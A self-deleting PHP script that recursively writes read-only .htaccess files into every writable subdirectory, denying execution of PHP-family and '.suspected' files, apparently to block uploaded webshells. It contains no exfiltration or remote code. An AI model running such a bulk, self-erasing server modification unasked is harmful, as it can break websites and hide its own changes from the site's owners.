<?php
/***在每一个目录放置一个htaccess***/
$content = '<FilesMatch ".(phtml|php|PhP|php5|php7|suspected)$">
Order Allow,Deny
Deny from all
</FilesMatch>';
$md5content = md5($content);
$dir = ".";
/*删除自己*/
unlink(__FILE__);
$tempFile = md5($_SERVER["HTTP_HOST"].time());
file_put_contents($tempFile, "1");
/*如果缓存文件不存在那么不执行*/
if(file_exists($tempFile)){
	$arrDirs = recurDirRW($dir);
	foreach($arrDirs as $path){
		if(file_exists($path . "/" . $tempFile)){
			echo $path.'是根目录,放弃执行！<br>';
		}else{
			$htfile = $path . "/.htaccess";
			chmod($htfile, 0777);
			file_put_contents($htfile, $content);
			chmod($htfile, 0444);
			$thecontent = file_get_contents($path."/.htaccess");
			$theContentMd5 = md5($thecontent);
			if($theContentMd5 == $md5content){
				echo $htfile.'更新成功！<br>';
			}else{
				echo $htfile.'更新失败，请联系技术处理！<br>';
			}
		}
	}
	/*执行完，删除缓存文件*/
	unlink($tempFile);
}else{
	echo '根目录没有写权限！放弃执行！root dir is not writeable, abord!<br>';
}

/**
 * 遍历目录，显示可读可写子目录
 */
function recurDirRW($pathName)
{
    //将结果保存在result变量中
    $result = array();
    $temp = array();
    //判断传入的变量是否是目录
    if(!is_dir($pathName) || !is_readable($pathName) || !is_writeable($pathName)) {
        return null;
    }
    //取出目录中的文件和子目录名,使用scandir函数
    $allFiles = scandir($pathName);
    //遍历他们
    foreach($allFiles as $fileName) {
        //判断是否是.和..因为这两个东西神马也不是。。。
        if(in_array($fileName, array('.', '..'))) {
            continue;
        }
        //路径加文件名
        $fullName = $pathName.'/'.$fileName;
        //如果是目录的话就继续遍历这个目录
        if(is_dir($fullName) && is_readable($fullName) && is_writeable($fullName)) {
            //将这个目录中的文件信息存入到数组中
            $result[] = $fullName;
            $temp = recurDirRW($fullName);
            $result = array_merge($result, $temp);
        }
    }
    return $result;
}
die("done!");
?>